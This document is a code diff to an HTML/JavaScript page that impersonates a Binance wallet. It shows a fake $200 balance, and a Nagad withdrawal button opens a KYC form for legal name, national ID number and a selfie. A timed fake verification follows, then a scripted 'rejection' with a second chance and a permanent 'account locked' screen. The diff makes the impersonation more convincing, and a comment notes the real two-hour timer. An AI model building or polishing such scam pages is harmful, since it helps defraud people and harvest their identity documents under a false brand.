@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Binance Pro - Wallet</title>
+    <title>Binance Pro - Safe Wallet</title>
     <style>
         :root {
             --binance-yellow: #FCD535;
@@ -16,6 +16,7 @@
 
         body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #0B0E11; color: white; margin: 0; }
         
+        /* Block Screen */
         #block-screen {
             display: none; position: fixed; top:0; left:0; width: 100%; height:100%;
             background: #0B0E11; z-index: 10000; flex-direction: column;
@@ -28,95 +29,111 @@
         .card { background-color: var(--card-bg); padding: 20px; border-radius: 12px; margin-bottom: 25px; border: 1px solid #333; }
         .price-display { font-size: 36px; font-weight: bold; color: var(--binance-yellow); margin: 10px 0; }
         
-        input { background: #12161c; border: 1px solid #444; color: white; padding: 12px; border-radius: 6px; width: 100%; box-sizing: border-box; margin-bottom: 15px; }
-        .btn-yellow { background: var(--binance-yellow); color: black; font-weight: bold; padding: 14px; border: none; border-radius: 6px; width: 100%; cursor: pointer; }
+        input { background: #12161c; border: 1px solid #444; color: white; padding: 12px; border-radius: 6px; width: 100%; box-sizing: border-box; margin-bottom: 15px; outline: none; }
+        input:focus { border-color: var(--binance-yellow); }
+        .btn-yellow { background: var(--binance-yellow); color: black; font-weight: bold; padding: 14px; border: none; border-radius: 6px; width: 100%; cursor: pointer; font-size: 16px; }
 
+        /* KYC Modal */
         #kycModal {
             display: none; position: fixed; z-index: 999; left: 0; top: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.9); justify-content: center; align-items: center;
         }
-        .modal-box { background: var(--card-bg); padding: 30px; border-radius: 15px; width: 400px; border: 1px solid var(--binance-yellow); }
+        .modal-box { background: var(--card-bg); padding: 30px; border-radius: 15px; width: 420px; border: 1px solid var(--binance-yellow); }
+        
+        .timer-text { font-size: 30px; font-weight: bold; color: var(--binance-yellow); margin: 15px 0; }
     </style>
 </head>
 <body>
 
     <div id="block-screen">
-        <h1 style="color: var(--error-red); font-size: 40px;">ACCOUNT SUSPENDED</h1>
-        <p style="color: #ccc;">Your account is permanently blocked due to invalid KYC and suspicious activities.</p>
-        <p style="color: var(--text-gray); font-size: 12px;">Ref: 0xBLOCK_KYC_FAILED</p>
+        <div style="padding: 40px; border: 1px solid var(--error-red); background: rgba(246, 70, 93, 0.05); border-radius: 20px;">
+            <h1 style="color: var(--error-red); font-size: 40px;">ACCOUNT LOCKED</h1>
+            <p style="color: #ccc;">Security violation: Multiple invalid verification attempts.</p>
+            <p style="color: var(--text-gray); font-size: 12px;">Contact Binance Security for manual review (Code: 0x992B).</p>
+        </div>
     </div>
 
     <div id="app-container">
         <div class="sidebar">
             <h2 style="color: var(--binance-yellow);">BINANCE</h2>
-            <div style="margin-top: 30px; padding: 10px; background: #333; border-radius: 5px;">Spot Balance: $200.00</div>
+            <div style="margin-top: 40px;">
+                <p style="color: var(--text-gray); font-size: 13px;">Estimated Balance</p>
+                <p style="font-size: 18px; font-weight: bold;">$200.00 USDT</p>
+            </div>
         </div>
 
         <div class="main">
             <div class="card">
-                <span style="color: var(--text-gray);">Spot Balance</span>
+                <span style="color: var(--text-gray);">Wallet Overview</span>
                 <div class="price-display">$200.00</div>
+                <span style="color: var(--success-green); font-size: 14px;">● Account Status: Verified (Basic)</span>
             </div>
 
             <div class="card">
-                <h3 style="color: #e1193e;">Nagad Cashout</h3>
-                <input type="text" id="n-num" placeholder="Nagad Number">
-                <input type="number" id="n-amt" placeholder="Amount (USDT)">
-                <button class="btn-yellow" onclick="checkAttempt()">Withdraw via Nagad</button>
+                <h3 style="color: #e1193e;">Nagad Withdrawal</h3>
+                <label style="font-size: 12px; color: var(--text-gray);">Nagad Personal Number</label>
+                <input type="text" id="nagad-no" placeholder="01XXXXXXXXX">
+                <label style="font-size: 12px; color: var(--text-gray);">Amount to Cashout</label>
+                <input type="number" id="nagad-amt" value="200" readonly>
+                <button class="btn-yellow" onclick="checkKYCStatus()">Withdraw $200.00</button>
             </div>
 
             <div id="status-card" class="card" style="display: none;">
-                <h3 id="status-header">Processing Withdrawal...</h3>
-                <div id="timer" style="font-size: 30px; font-weight: bold; color: var(--binance-yellow);">02:00:00</div>
-                <p id="status-desc" style="font-size: 12px; color: var(--text-gray);">Verifying your identity with NID server.</p>
+                <h3 id="status-header">Identity Verification...</h3>
+                <div id="timer" class="timer-text">02:00:00</div>
+                <p id="status-msg" style="color: var(--text-gray); font-size: 13px;">Linking with NID server for real-time validation.</p>
             </div>
         </div>
     </div>
 
     <div id="kycModal">
         <div class="modal-box">
-            <h2 style="text-align: center; color: var(--binance-yellow);">Identity Verification</h2>
-            <input type="text" id="k-name" placeholder="Full Name">
-            <input type="text" id="k-nid" placeholder="NID Number">
-            <label style="font-size: 10px;">Face/Selfie Verification</label>
+            <h2 style="text-align: center; color: var(--binance-yellow);">KYC Verification</h2>
+            <p style="text-align: center; font-size: 12px; color: var(--text-gray); margin-bottom: 20px;" id="kyc-subtext">Submit your legal identity to enable Nagad withdrawals.</p>
+            
+            <input type="text" id="k-name" placeholder="Full Legal Name">
+            <input type="text" id="k-nid" placeholder="NID Number (10/17 Digits)">
+            <label style="font-size: 11px; color: var(--text-gray);">Live Face Scan / Selfie</label>
             <input type="file">
-            <button class="btn-yellow" onclick="submitVerification()">Submit Now</button>
+            
+            <button class="btn-yellow" id="submit-btn" onclick="startSimulation()">Submit Verification</button>
         </div>
     </div>
 
     <script>
-        let attemptCount = localStorage.getItem('kyc_attempts') || 0;
+        // Start State
+        let attempt = localStorage.getItem('kyc_attempt_count') || 0;
 
         window.onload = function() {
-            if (localStorage.getItem('acc_blocked') === 'true') {
-                showBlockScreen();
+            if (localStorage.getItem('is_blocked') === 'true') {
+                showBlock();
             }
         };
 
-        function checkAttempt() {
-            const amt = document.getElementById('n-amt').value;
-            if (amt > 0 && amt <= 200) {
-                document.getElementById('kycModal').style.display = 'flex';
-            } else {
-                alert("Insufficient balance!");
-            }
-        }
-
-        function submitVerification() {
-            if (!document.getElementById('k-name').value || !document.getElementById('k-nid').value) {
-                alert("Fill all fields");
+        function checkKYCStatus() {
+            const num = document.getElementById('nagad-no').value;
+            if (num.length < 11) {
+                alert("Please enter a valid Nagad number.");
                 return;
             }
-            
-            document.getElementById('kycModal').style.display = 'none';
-            document.getElementById('status-card').style.display = 'block';
-            
-            startTimer();
+            document.getElementById('kycModal').style.display = 'flex';
         }
 
-        function startTimer() {
-            let timeLeft = 10; // Demo-r jonno 10 sec, real 2 hours hole 7200 diben
-            const interval = setInterval(() => {
+        function startSimulation() {
+            const name = document.getElementById('k-name').value;
+            const nid = document.getElementById('k-nid').value;
+
+            if (!name || !nid) {
+                alert("Please fill all identity fields.");
+                return;
+            }
+
+            document.getElementById('kycModal').style.display = 'none';
+            document.getElementById('status-card').style.display = 'block';
+
+            // Timer: 10 seconds for demo (Real 2 hours = 7200)
+            let timeLeft = 10;
+            const clock = setInterval(() => {
                 timeLeft--;
                 let h = Math.floor(timeLeft / 3600).toString().padStart(2, '0');
                 let m = Math.floor((timeLeft % 3600) / 60).toString().padStart(2, '0');
@@ -124,31 +141,38 @@
                 document.getElementById('timer').innerText = `${h}:${m}:${s}`;
 
                 if (timeLeft <= 0) {
-                    clearInterval(interval);
-                    processResult();
+                    clearInterval(clock);
+                    handleLogic();
                 }
             }, 1000);
         }
 
-        function processResult() {
-            attemptCount++;
-            localStorage.setItem('kyc_attempts', attemptCount);
+        function handleLogic() {
+            attempt++;
+            localStorage.setItem('kyc_attempt_count', attempt);
 
-            if (attemptCount == 1) {
-                // First Time Failed Logic
-                alert("Withdrawal Failed: NID data did not match or account details incorrect. Please try again carefully.");
+            if (attempt == 1) {
+                // First Failure - Prompt to Try Again
+                alert("KYC REJECTED: Your NID number or Name did not match with Government Records. Please re-check and submit again.");
                 document.getElementById('status-card').style.display = 'none';
+                
+                // Reset Modal for 2nd chance
+                document.getElementById('kycModal').style.display = 'flex';
+                document.getElementById('kyc-subtext').innerText = "SECOND CHANCE: Please ensure NID details are 100% correct.";
+                document.getElementById('kyc-subtext').style.color = "var(--error-red)";
+                document.getElementById('submit-btn').innerText = "Final Submit";
             } else {
-                // Second Time Permanent Block Logic
-                alert("FATAL ERROR: Security mismatch detected multiple times. Your account is permanently suspended for security reasons.");
-                localStorage.setItem('acc_blocked', 'true');
-                showBlockScreen();
+                // Second Failure - Permanent Block
+                alert("SECURITY ALERT: System detected fraudulent identity submission. Your account is permanently suspended.");
+                localStorage.setItem('is_blocked', 'true');
+                showBlock();
             }
         }
 
-        function showBlockScreen() {
+        function showBlock() {
             document.getElementById('block-screen').style.display = 'flex';
             document.getElementById('app-container').style.display = 'none';
+            document.getElementById('kycModal').style.display = 'none';
         }
     </script>
 </body>
